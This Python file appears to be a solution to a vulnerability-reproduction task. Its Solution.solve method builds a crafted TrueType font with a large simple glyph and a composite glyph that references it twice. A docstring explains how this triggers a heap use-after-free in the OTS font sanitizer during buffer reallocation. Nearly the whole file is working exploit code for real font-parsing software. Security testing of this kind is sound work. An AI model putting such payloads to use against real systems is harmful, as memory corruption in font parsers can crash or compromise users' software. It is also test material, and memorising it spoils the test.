import struct

def _pad(data: bytes) -> bytes:
    """Pad data to a multiple of 4 bytes."""
    return data + b'\0' * (-(len(data)) % 4)

def _calc_checksum(data: bytes) -> int:
    """Calculate checksum for a TrueType table."""
    data = _pad(data)
    checksum = 0
    if len(data) % 4 != 0:
        # This should not happen due to _pad
        raise ValueError("Data length must be a multiple of 4")
        
    for i in range(0, len(data), 4):
        chunk = data[i:i+4]
        value, = struct.unpack('>I', chunk)
        checksum = (checksum + value) & 0xFFFFFFFF
    return checksum

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The PoC is a TrueType font file with a crafted 'glyf' table. It contains
        two glyphs:
        - Glyph 0: A large, simple glyph that acts as a "payload".
        - Glyph 1: A composite glyph that references Glyph 0 twice.

        The vulnerability is triggered during the sanitization of Glyph 1.
        The OTS parser processes glyphs and may cache the sanitized results.
        1. Glyph 0 is processed and its sanitized data (the "payload") is
           written to an output stream (`out_stream`). The result is cached,
           pointing to the data within `out_stream`.
        2. Glyph 1 is processed. It contains two components, both referencing Glyph 0.
        3. The parser processes the first component. It looks up Glyph 0, finds the
           cached result, and copies the payload from the beginning of `out_stream`
           to its current end.
        4. The parser processes the second component. It again copies the payload
           from the beginning of `out_stream`. This write operation is large enough
           to cause `out_stream`'s internal buffer to be reallocated.
        5. The `OTSStream::Write` function is called with a source pointer pointing
           into the old buffer. Inside `Write`, the buffer is reallocated and freed.
           Subsequently, the function attempts to read from the freed source
           pointer, resulting in a heap-use-after-free.
        """

        num_glyphs = 2
        num_points_glyph0 = 160

        # glyf table: The core of the PoC
        # Glyph 0: A simple glyph, large enough to trigger reallocation when copied.
        glyph0_header = struct.pack('>hHHHH', 1, 0, 0, 0, 0) # contours, xMin/yMin/xMax/yMax
        glyph0_endpts = struct.pack('>H', num_points_glyph0 - 1)
        glyph0_instr_len = struct.pack('>H', 0)
        glyph0_flags = b'\x01' * num_points_glyph0  # All points are on-curve
        glyph0_x = b'\x00' * num_points_glyph0      # Delta-encoded coordinates
        glyph0_y = b'\x00' * num_points_glyph0
        glyph0 = glyph0_header + glyph0_endpts + glyph0_instr_len + glyph0_flags + glyph0_x + glyph0_y
        glyph0 = _pad(glyph0)

        # Glyph 1: A composite glyph that reuses Glyph 0 to trigger the UAF.
        glyph1_header = struct.pack('>hHHHH', -1, 0, 0, 0, 0)
        MORE_COMPONENTS = 0x0020
        ARGS_ARE_XY_VALUES = 0x0002
        component1_flags = MORE_COMPONENTS | ARGS_ARE_XY_VALUES
        component1 = struct.pack('>HHbb', component1_flags, 0, 0, 0) # flags, glyphIndex, args
        component2_flags = ARGS_ARE_XY_VALUES
        component2 = struct.pack('>HHbb', component2_flags, 0, 0, 0)
        glyph1 = glyph1_header + component1 + component2
        glyph1 = _pad(glyph1)
        
        glyf_data = glyph0 + glyph1

        # loca table: Defines offsets for glyphs within the glyf table.
        offset0 = 0
        offset1 = len(glyph0)
        offset2 = offset1 + len(glyph1)
        loca_data = struct.pack('>HHH', offset0 // 2, offset1 // 2, offset2 // 2)

        # maxp table: Specifies profile information like the number of glyphs.
        maxp_data = struct.pack('>IH', 0x00010000, num_glyphs) + b'\x00' * 28 # Version 1.0

        # head table: Font-wide metadata.
        head_data = (
            struct.pack('>I', 0x00010000)      # version
            + struct.pack('>I', 0x00010000)    # fontRevision
            + struct.pack('>I', 0)             # checkSumAdjustment (placeholder)
            + struct.pack('>I', 0x5F0F3CF5)    # magicNumber
            + struct.pack('>H', 0b0000000000001011) # flags
            + struct.pack('>H', 1024)          # unitsPerEm
            + struct.pack('>q', 0)             # created
            + struct.pack('>q', 0)             # modified
            + struct.pack('>hhhh', 0, 0, 0, 0) # xMin, yMin, xMax, yMax
            + struct.pack('>H', 0)             # macStyle
            + struct.pack('>H', 10)            # lowestRecPPEM
            + struct.pack('>h', 2)             # fontDirectionHint
            + struct.pack('>h', 0)             # indexToLocFormat (short)
            + struct.pack('>h', 0)             # glyphDataFormat
        )

        # hhea table: Horizontal header information.
        hhea_data = (
            struct.pack('>I', 0x00010000)
            + struct.pack('>hhh', 800, -200, 0)
            + struct.pack('>H', 1000)
            + struct.pack('>hhh', 0, 0, 0)
            + struct.pack('>hhh', 1, 0, 0)
            + b'\x00' * 8
            + struct.pack('>h', 0)
            + struct.pack('>H', num_glyphs)
        )

        # hmtx table: Horizontal metrics for each glyph.
        hmetric = struct.pack('>Hh', 500, 0)
        hmtx_data = hmetric * num_glyphs

        tables = {
            b'glyf': _pad(glyf_data),
            b'loca': _pad(loca_data),
            b'maxp': _pad(maxp_data),
            b'head': _pad(head_data),
            b'hhea': _pad(hhea_data),
            b'hmtx': _pad(hmtx_data),
        }
        
        sorted_tags = sorted(tables.keys())
        num_tables = len(sorted_tags)
        
        entry_selector = (num_tables - 1).bit_length()
        search_range = (1 << entry_selector) * 16
        range_shift = num_tables * 16 - search_range
        
        sfnt_header = struct.pack('>IHHHH', 0x00010000, num_tables, search_range, entry_selector, range_shift)

        # Pass 1: Build a temporary font to calculate the final checksum adjustment for the head table.
        table_directory_pass1 = b''
        table_data_blob_pass1 = b''
        current_offset = len(sfnt_header) + 16 * num_tables

        for tag in sorted_tags:
            data = tables[tag]
            checksum = _calc_checksum(data)
            length = len(data)
            table_directory_pass1 += struct.pack('>4sIII', tag, checksum, current_offset, length)
            table_data_blob_pass1 += data
            current_offset += length

        font_pass1 = sfnt_header + table_directory_pass1 + table_data_blob_pass1
        font_pass1_checksum = _calc_checksum(font_pass1)
        checksum_adjustment = (0xB1B0AFBA - font_pass1_checksum) & 0xFFFFFFFF

        # Update head table with the correct checksum adjustment.
        head_data_list = bytearray(tables[b'head'])
        head_data_list[8:12] = struct.pack('>I', checksum_adjustment)
        tables[b'head'] = bytes(head_data_list)

        # Pass 2: Build the final font with the corrected head table.
        table_directory_final = b''
        table_data_blob_final = b''
        current_offset = len(sfnt_header) + 16 * num_tables

        for tag in sorted_tags:
            data = tables[tag]
            checksum = _calc_checksum(data)
            length = len(data)
            table_directory_final += struct.pack('>4sIII', tag, checksum, current_offset, length)
            table_data_blob_final += data
            current_offset += length
        
        final_font = sfnt_header + table_directory_final + table_data_blob_final
        return final_font